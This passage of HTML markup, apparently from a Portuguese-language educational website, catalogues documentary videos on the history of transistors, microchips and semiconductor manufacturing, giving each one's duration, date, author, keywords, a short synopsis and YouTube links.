+                    </h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Palavras-chave:</u> fabricação de semicondutores.<br></font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Descrição:</u> As instalações da fabricante de chips Texas Instruments, mostram como era a tecnologia mais avançada para o momento.</font></span></span>
+                    </h3>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%; text-align: center;"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">&nbsp;_ _ __ ________________________________________________________________ __ _ _</font></span></span>
+                    </h3>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Video 4.</u> "Como é feito um microchip?"<br></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Tempo: 5'00". Data: 2006.</u></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+</font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Autor:</u> Discovery Channel<br></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Palavras-chave:</u> <br></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Descrição:</u> Este vídeo de fabricação de chips mostra a tecnologia um pouco mais antiga, o que é interessante de se considerar.</font></span></span>
+                    </h3>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%; text-align: center;"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">&nbsp;_ _ __ ________________________________________________________________ __ _ _</font></span></span>
+                    </h3>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Video 5.</u> Reportagem sobre o Vale da Eletrônica.<br></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Tempo: 5'25" Data: 2009.</u></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+</font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Autor:</u> RedeTV News.<br></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Palavras-chave:</u> fabricação de semicondutores.<br></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Descrição:</u>
+ A cidade de Santa Rita do Sapucaí, no sul de Minas Gerais, é tema desta
+ reportagem onde mostra a história e a prosperidade do principal polo 
+brasileiro de fábricas e empresas do ramo da eletrônica. Também 
+conhecida como Vale do Silício brasileiro.</font></span></span>
+                    </h3><span style="font-family: Roboto;">
+                    <br></span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%; text-align: center;"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">&nbsp;_ _ __ ________________________________________________________________ __ _ _</font></span></span>
+                    </h3>
+                    <p><br></p><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Video 6.</u> Entrevista com Newton C. Braga.<br></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Tempo: 5'25". Data: 2012.</u></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+</font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Autor:</u> Revista FACTA.<br></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Palavras-chave:</u> <br></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Descrição:</u> O aclamado prof. Newton C. Braga, conhecido por suas coleções de guias e manuais de projetos de circuitos,</font>
+                        </span><span style="color: rgb(0, 0, 0);"><font size="2"> fala sobre a eletrônica analógica, e explica a utilidade de por que conhecer tecnologias antigas tanto quanto as tecnologias novas.</font></span></span>
+                    </h3>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%; text-align: center;"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">&nbsp;_ _ __ ________________________________________________________________ __ _ _</font></span></span>
+                    </h3>
+                    <p><br></p><span style="font-family: Roboto;">
+                    </span>
+                    <h3><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+</font>
+                        </span></span>
+                    </h3>
+                    <h3><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);">
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Video 7.</u> A história dos microchips e transistores.<br></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Tempo: 3'02" Data:</u></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+</font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Autor:</u> History Channel.<br></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Palavras-chave:</u> história da computação, fabricação de semicondutores.<br></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Descrição:</u> A história e a explicação conceitual de como os chips funcionam. Observe a apresentação do Zilog Z80, que foi um microprocessador bastante comum da nas décadas de 70 e 80.</font></span>
+                        <span style="color: rgb(0, 0, 0);"></span>
+                        </span>
+                    </h3><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"></span><span style="color: rgb(0, 0, 0);">
+                        </span>
+
+                    </span>
+                    <p><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"></span><span style="color: rgb(0, 0, 0);"></span></span>
+                    </p>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%; text-align: center;"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">&nbsp;_ _ __ ________________________________________________________________ __ _ _</font></span></span>
+                    </h3>
+                    <p>
+                    </p>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Video 8.</u> Da areia ao chip - como é feito um CPU.<br></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Tempo: 10'13". Data: 2009.</u></font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+</font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Autor:</u> Global Foundries (marca AMD de processadores).</font></span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Palavras-chave:</u> fabricação de semicondutores, animação 3D.<br></font></span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Descrição:</u> Mostra o processo atual de fabricação de processadores AMD e a conta quais são necessidades dessa indústria para a qualidade na fabricação de produtos.</font></span></span>
+                    </h3>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"></span><span style="color: rgb(0, 0, 0);"></span></span>
+                    </h3><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"></span><span style="color: rgb(0, 0, 0);">
+                        </span>
+
+                    </span>
+                    <p><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"></span><span style="color: rgb(0, 0, 0);"></span></span>
+                    </p>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%; text-align: center;"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">&nbsp;_ _ __ ________________________________________________________________ __ _ _</font></span></span>
+                    </h3>
+                    <p><br></p>
+                    <h3><span style="font-family: Roboto;"><font size="4"><span style="color: rgb(0, 0, 0);"><span class="heading3">Sessão 3. Vídeos históricos mostram a evolução do transistor nos EUA.<br></span></span>
+                        </font>
+                        </span>
+                    </h3>
+                    <h3 style="text-align: center;"><i><span style="font-family: Roboto;"><font size="4"><span style="color: rgb(0, 0, 0);"><span class="heading3"></span></span></font><font size="2"><span style="color: rgb(0, 0, 0);">Tempo total: 2h e 40 minutos. Idioma: inglês.</span></font></span></i></h3>
+                    <span style="font-family: Roboto;">
+
+                        </span>
+                    <h3><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+                    </font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);">
+                        </span></span>
+                    </h3><span style="font-family: Roboto;"><b><span style="color: rgb(0, 0, 0);"><font size="2">
+                </font></span></b>
+                    </span>
+                </div>
+            </div>
+
+
+
+            <a data-silex-type="container" class="editable-style silex-id-1513423946729-17 container-element" data-silex-id="silex-id-1513423946729-17" style="" href="#!page-transistor">
+                <div data-silex-type="text" class="editable-style silex-id-1513424070383-18 text-element" data-silex-id="silex-id-1513424070383-18" style="">
+                    <div class="silex-element-content normal"><b>Voltar &lt;--</b><br></div>
+                </div>
+            </a>
+            <div data-silex-type="text" class="editable-style text-element silex-id-1517765408536-0 page-guia-2 paged-element" data-silex-id="silex-id-1517765408536-0" style="">
+                <div class="silex-element-content normal"><span style="font-family: Roboto;"><b><span style="color: rgb(0, 0, 0);"><font size="2">
+                    </font></span></b>
+                    </span>
+                    <h1 class="heading1"><span style="font-family: Roboto;"><span style="color: rgb(120, 63, 4);">Sinopses</span></span>
+                    </h1><span style="font-family: Roboto;">
+                    </span>
+                    <h2><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"></span><span style="color: rgb(0, 0, 0);"><font size="2"><span class="heading2"></span>
+                        </font>
+                        </span>
+                        </span>
+                    </h2><span style="font-family: Roboto;">
+                    </span>
+                    <h3>
+                        <span style="font-family: Roboto;"><font size="4"><span style="color: rgb(0, 0, 0);"><span class="heading2">Sessão 2. A Revolução Tecnológica no Japão.<br></span>
+                        </span>
+                        </font>
+                        </span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3>
+                        <span style="font-family: Roboto;"><font size="4"><span style="color: rgb(0, 0, 0);">
+                    </span>
+                        </font>
+                        </span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3>
+                        <span style="font-family: Roboto;"><font size="4"><span style="color: rgb(0, 0, 0);"></span>
+                        </font>
+                        </span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3>
+                        <span style="font-family: Roboto;"><font size="4"><span style="color: rgb(0, 0, 0);">
+                    </span>
+                        </font>
+                        </span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3>&nbsp;<span style="font-family: Roboto;"><font size="4"><span style="color: rgb(0, 0, 0);"><i><br></i></span>
+                        </font>
+                        </span>
+                    </h3>
+                    <h3 style="text-align: center;"><i><span style="font-family: Roboto;"><font size="4"><span style="color: rgb(0, 0, 0);"><span class="heading3"></span></span></font><font size="2"><span style="color: rgb(0, 0, 0);">Tempo total: 2h e 40 minutos. Idioma: português.</span></font></span></i></h3>
+                    <p><br></p>
+                    <h3><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Video 1.</u> “O Nascimento do Transistor" - Documentário.</font>
+                        </span></span>
+
+                    </h3>
+                    <a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1">
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Tempo: 1h19'. Data: 1983.</u></font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                    </h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+
+</font>
+                        </span></span></a>
+                    </h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Autor:</u> NHK Tokyo / TV Cultura</font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+
+</font>
+                        </span></span></a>
+                    </h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Palavras-chave:</u> transistor.<br></font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+</font>
+                        </span></span></a>
+                    </h3><a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54&amp;index=1"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Descrição:</u> Primeiro e segundo episódios da série.</font></span></span>
+                    </h3>
+                    <p><br></p>
+
+                    <p><br></p>
+                    <p><br></p>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%; text-align: center;"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">&nbsp;_ _ __ ________________________________________________________________ __ _ _</font></span><br></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+
+</font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    
+                    </span>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Video 2.</u> "A Guerra das Calculadoras” -&nbsp;</font></span><span style="color: rgb(0, 0, 0);"><font size="2">Documentário.
+</font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=HmvppRT9nm4&amp;index=2&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><a href="https://www.youtube.com/watch?v=HmvppRT9nm4&amp;index=2&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);">
+                        </span></span></a>
+                    </h3><a href="https://www.youtube.com/watch?v=HmvppRT9nm4&amp;index=2&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Tempo: 32'27". Data: 1983.</u></font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=HmvppRT9nm4&amp;index=2&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3><a href="https://www.youtube.com/watch?v=HmvppRT9nm4&amp;index=2&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+</font>
+                        </span></span></a>
+                    </h3><a href="https://www.youtube.com/watch?v=HmvppRT9nm4&amp;index=2&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Autor:</u>&nbsp;</font></span><span style="color: rgb(0, 0, 0);"></span><span style="color: rgb(0, 0, 0);"><font size="2">NHK Tokyo / TV Cultura</font></span></span>
+                    </h3>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                    </h3><a href="https://www.youtube.com/watch?v=HmvppRT9nm4&amp;index=2&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Palavras-chave:</u> calculadoras.</font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=HmvppRT9nm4&amp;index=2&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Descrição:</u> Continuação .</font></span></span>
+                    </h3>
+                    <p><br></p>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%; text-align: center;"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">&nbsp;_ _ __ ________________________________________________________________ __ _ _</font></span></span>
+                    </h3>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Video 3.</u> “O Mundo do Mícron” - Documentário</font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>
+</u></font>
+                        </span></span></a>
+                    </h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Tempo: 43’28” Data: 1983.</u></font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+
+</font>
+                        </span></span></a>
+                    </h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Autor:</u> NHK Tokyo / TV Cultura</font></span></span>
+                    </h3>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                    </h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+</font>
+                        </span></span></a>
+                    </h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left">
+                        <span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Palavras-chave:</u> fabricação de semicondutores.<br></font>
+                        </span></span>
+                    </h3><a href="https://www.youtube.com/watch?v=l7-EmE7Ixuo&amp;index=3&amp;list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54"><span style="font-family: Roboto;">
+                    </span>
+                    </a>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%;" align="left"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2"><u>Descrição:</u> Continuação.</font></span></span>
+                    </h3>
+                    <h3 class="western" style="margin-bottom: 0cm; line-height: 100%; text-align: center;"><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">&nbsp;_ _ __ ________________________________________________________________ __ _ _</font></span></span>
+                    </h3><span style="font-family: Roboto;"></span>
+                    <h3><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);"><font size="2">
+                    </font>
+                        </span></span>
+                    </h3><span style="font-family: Roboto;">
+                    </span>
+                    <h3><span style="font-family: Roboto;"><span style="color: rgb(0, 0, 0);">
+                        </span></span>
+                    </h3><span style="font-family: Roboto;"><b><span style="color: rgb(0, 0, 0);"><font size="2">
+                </font></span></b>
+                    </span>
+                </div>
+            </div>
+            <div data-silex-type="container" class="editable-style container-element silex-id-1517766508156-2 page-guia-2 paged-element" data-silex-id="silex-id-1517766508156-2" style="">
+                <a target="_blank" data-silex-type="image" class="editable-style image-element silex-id-1517766508157-3" data-silex-id="silex-id-1517766508157-3" style="" href="https://www.youtube.com/watch?v=Wnbq5ny58Es&amp;list=PLeH2yLt2MpadCfhigGNIAc3CuSU6cewsO"><img src="assets/transistor_na_turquesa.gif" class="silex-element-content"></a>
+                <a target="_blank" data-silex-type="image" class="editable-style image-element silex-id-1517766508162-4" data-silex-id="silex-id-1517766508162-4" style="" href="https://www.youtube.com/watch?v=22hu1bEsDGw&amp;list=PLeH2yLt2MpadCfhigGNIAc3CuSU6cewsO&amp;index=2"><img src="assets/circuito_japao.gif" class="silex-element-content"></a>
+                <a target="_blank" data-silex-type="image" class="editable-style image-element silex-id-1517766508164-5" data-silex-id="silex-id-1517766508164-5" style="" href="https://www.youtube.com/watch?v=a9BrgwBLvV0&amp;list=PLeH2yLt2MpadCfhigGNIAc3CuSU6cewsO&amp;index=3"><img src="assets/micron.gif" class="silex-element-content"></a>
+
+
+
+
+
+
+            </div>
+            <div data-silex-type="image" class="editable-style silex-id-1517779456110-1 image-element page-guia-3 paged-element" data-silex-id="silex-id-1517779456110-1" style=""><img src="assets/site_em_construcao.jpg" class="silex-element-content"></div>
+        </div>
+    </div>
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1490693608162-3 section-element hide-on-mobile" data-silex-id="silex-id-1490693608162-3">
+        <div data-silex-type="container" class="editable-style silex-element-content website-width silex-id-1490693608161-2 silex-container-content container-element prevent-draggable" data-silex-id="silex-id-1490693608161-2">
+            <a data-silex-type="text" class="editable-style text-element silex-id-1439554967492-62 nav nav-mark page-link-active" data-silex-id="silex-id-1439554967492-62" style="" href="#!page-videoteca">
+                <div class="silex-element-content normal">
+                    <font size="3">
+                    </font>
+                    <div style="text-align: center;">
+                        <font size="3"><b>iniciar</b></font>
+                    </div>
+                    <font size="3">
+                    </font>
+                </div>
+            </a>
